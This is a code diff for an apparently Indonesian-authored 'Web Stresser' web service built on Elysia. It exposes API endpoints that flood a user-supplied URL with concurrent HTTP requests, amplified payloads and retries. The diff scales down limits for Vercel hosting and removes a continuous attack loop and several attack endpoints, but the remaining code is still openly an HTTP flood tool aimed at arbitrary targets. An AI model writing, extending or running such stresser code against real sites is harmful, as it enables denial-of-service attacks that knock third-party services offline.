@@ -1,16 +1,11 @@
 import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
-import { runAutocannon } from './attackers/autocannonAttack.js';
-import { runArtillery } from './attackers/artilleryAttack.js';
-import { runLoadtest } from './attackers/loadtestAttack.js';
-import { runCombinedAttack } from './attackers/combinedAttack.js';
 
-// Optimasi koneksi HTTP
+// Optimasi koneksi untuk Vercel
 const globalAgent = new Agent({
-  connections: 5000,
+  connections: 100,
   pipelining: 1,
   keepAliveTimeout: 60000,
-  keepAliveMaxTimeout: 60000,
 });
 setGlobalDispatcher(globalAgent);
 
@@ -22,7 +17,7 @@ setInterval(() => {
   }
 }, 30000);
 
-// Helper functions (amplification, random string, dll)
+// Helper functions
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -37,7 +32,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return 'X'.repeat(size);
 }
 
-// Single attack (HTTP flood dengan semua fitur)
+// Single attack
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -121,7 +116,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   const fetchOptions: any = {
     method: finalMethod,
     headers: finalHeaders,
-    signal: AbortSignal.timeout(timeout),
+    signal: AbortSignal.timeout(Math.min(timeout, 9000)),
     redirect: 'manual',
     dispatcher: globalAgent,
   };
@@ -137,7 +132,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   let retriesUsed = 0;
 
   const baseDelay = 100;
-  for (let attempt = 0; attempt <= retryCount; attempt++) {
+  for (let attempt = 0; attempt <= Math.min(retryCount, 2); attempt++) {
     if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
     const start = Date.now();
     try {
@@ -172,7 +167,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// Batch attack (mirip single, tapi dengan concurrency dari frontend)
+// Batch attack (massive)
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -214,7 +209,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
 
     const runOne = async () => {
       const result = await singleAttack({
-        url, method, headers, body, timeout, retryCount, randomDelay,
+        url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
         keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType
       });
       if (result.success) successCount++;
@@ -225,7 +220,8 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
 
     let index = 0;
     const workers: Promise<void>[] = [];
-    for (let i = 0; i < concurrency; i++) {
+    const actualConcurrency = Math.min(concurrency, 50);
+    for (let i = 0; i < actualConcurrency; i++) {
       workers.push(new Promise<void>(async (resolve) => {
         while (index < targetTotal) {
           index++;
@@ -238,18 +234,13 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     return { success: successCount, fail: failCount, bytes, latencies };
   };
 
-  do {
-    const batchResult = await runBatch(total);
-    totalSuccess += batchResult.success;
-    totalFail += batchResult.fail;
-    totalBytes += batchResult.bytes;
-    allLatencies.push(...batchResult.latencies);
-    loopCount++;
-
-    if (continuous && intervalMs > 0) {
-      await new Promise(r => setTimeout(r, intervalMs));
-    }
-  } while (continuous && loopCount < 9999);
+  const actualTotal = Math.min(total, 5000);
+  const batchResult = await runBatch(actualTotal);
+  totalSuccess += batchResult.success;
+  totalFail += batchResult.fail;
+  totalBytes += batchResult.bytes;
+  allLatencies.push(...batchResult.latencies);
+  loopCount++;
 
   const totalTime = Date.now() - startTime;
   const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
@@ -265,7 +256,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     avgLatencyMs: avgLatency,
     rps,
     loopCount,
-    latencies: allLatencies.slice(0, 200),
+    latencies: allLatencies.slice(0, 100),
   };
 }
 
@@ -274,15 +265,11 @@ export const app = new Elysia()
   .onError(({ error, set }) => {
     set.status = 200;
     console.error(error);
-    const errorMessage = error instanceof Error ? error.message : String(error);
-    return { success: false, error: errorMessage };
-  })
-  .onAfterHandle(({ set }) => {
-    set.headers['Alt-Svc'] = 'h3=":443"; ma=86400';
+    return { success: false, error: error.message };
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Extreme - Autocannon/Artillery/Loadtest Edition',
+    message: 'Web Stresser Ultimate - Elysia on Vercel',
     version: '2.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
@@ -333,77 +320,6 @@ export const app = new Elysia()
       total: t.Number(),
       continuous: t.Boolean(),
       intervalMs: t.Number(),
-    }),
-  })
-  .post('/api/autocannon', async ({ body }) => {
-    try {
-      const result = await runAutocannon(body as any);
-      return { success: true, result };
-    } catch (err: any) {
-      return { success: false, error: err.message };
-    }
-  }, {
-    body: t.Object({
-      url: t.String(),
-      connections: t.Number(),
-      duration: t.Number(),
-      method: t.Optional(t.String()),
-      headers: t.Optional(t.Record(t.String(), t.String())),
-      body: t.Optional(t.String()),
-      amount: t.Optional(t.Number()),
-    }),
-  })
-  .post('/api/artillery', async ({ body }) => {
-    try {
-      const result = await runArtillery(body as any);
-      return { success: true, result };
-    } catch (err: any) {
-      return { success: false, error: err.message };
-    }
-  }, {
-    body: t.Object({
-      url: t.String(),
-      duration: t.Number(),
-      arrivalRate: t.Number(),
-      method: t.Optional(t.String()),
-      headers: t.Optional(t.Record(t.String(), t.String())),
-      body: t.Optional(t.String()),
-    }),
-  })
-  .post('/api/loadtest', async ({ body }) => {
-    try {
-      const result = await runLoadtest(body as any);
-      return { success: true, result };
-    } catch (err: any) {
-      return { success: false, error: err.message };
-    }
-  }, {
-    body: t.Object({
-      url: t.String(),
-      maxRequests: t.Number(),
-      concurrency: t.Number(),
-      method: t.Optional(t.String()),
-      headers: t.Optional(t.Record(t.String(), t.String())),
-      body: t.Optional(t.String()),
-      timeout: t.Optional(t.Number()),
-    }),
-  })
-  .post('/api/combined', async ({ body }) => {
-    try {
-      const result = await runCombinedAttack(body as any);
-      return { success: true, result };
-    } catch (err: any) {
-      return { success: false, error: err.message };
-    }
-  }, {
-    body: t.Object({
-      url: t.String(),
-      connections: t.Number(),
-      duration: t.Number(),
-      totalRequests: t.Number(),
-      method: t.Optional(t.String()),
-      headers: t.Optional(t.Record(t.String(), t.String())),
-      body: t.Optional(t.String()),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
